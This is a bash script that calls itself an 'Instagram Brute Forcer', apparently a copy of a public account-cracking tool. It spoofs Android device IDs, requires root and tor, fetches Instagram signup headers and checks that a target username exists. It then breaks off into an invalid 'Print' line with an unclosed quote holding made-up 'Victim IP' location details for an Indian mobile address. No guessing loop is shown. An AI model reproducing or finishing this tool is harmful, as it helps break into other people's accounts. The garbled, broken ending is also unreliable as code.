#!/bin/bash

# Coded by: github.com

# Instagram: 

trap 'store;exit 1' 2

string4=$(openssl rand -hex 32 | cut -c 1-4)

string8=$(openssl rand -hex 32  | cut -c 1-8)

string12=$(openssl rand -hex 32 | cut -c 1-12)

string16=$(openssl rand -hex 32 | cut -c 1-16)

device="android-$string16"

uuid=$(openssl rand -hex 32 | cut -c 1-32)

phone="$string8-$string4-$string4-$string4-$string12"

guid="$string8-$string4-$string4-$string4-$string12"

var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)

var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)

checkroot() {

if [[ "$(id -u)" -ne 0 ]]; then

    printf "\e[1;77mPlease, run this program as root!\n\e[0m"

    exit 1

fi

}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }

command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }

command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }

command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }

command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }

command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }

command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }

command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }

command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }

if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then

echo "/dev/urandom not found!"

exit 1

fi

}

banner() {

printf "\e[1;92m     _                                   _             _  _           \e[0m\n"

printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"

printf "\e[1;92m( \ | | ____    ___  _| |_  _____   ___ | |__   _____ | || |          \e[0m\n"

printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |          \e[0m\n"

printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"

printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"

printf "\n"

printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.4 Author: cyberboy (Github/IG)   \e[0m\n"

printf "\n"

}

function start() {

banner

checkroot

dependencies

read -p $'\e[1;92mUsername account: \e[0m' user

checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")

if [[ "$checkaccount" == 1 ]]; then

printf "\e[1;91mInvalid Username! Try again\e[0m\n"

sleep 1

start

else

Print "Victim IP: 106.210.49.22

[*] User-Agent:  User-Agent: Mozilla/5.0 (Linux; Android unknown device) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36

[*] Saved: instagram/saved.ip.txt

[*] Hostname: 106.210.49.22

[*] IP Continent: Asia (AS)

[*] IP Country:  India

[*] State: Delhi

[*] City Location: Delhi



[*] AS Number: AS45609 Bharti Airtel Ltd. AS for GPRS Service

[*] IP Address Speed: Mobile/Cellular Internet Speed

[*] IP Currency: Indian rupee (INR)"
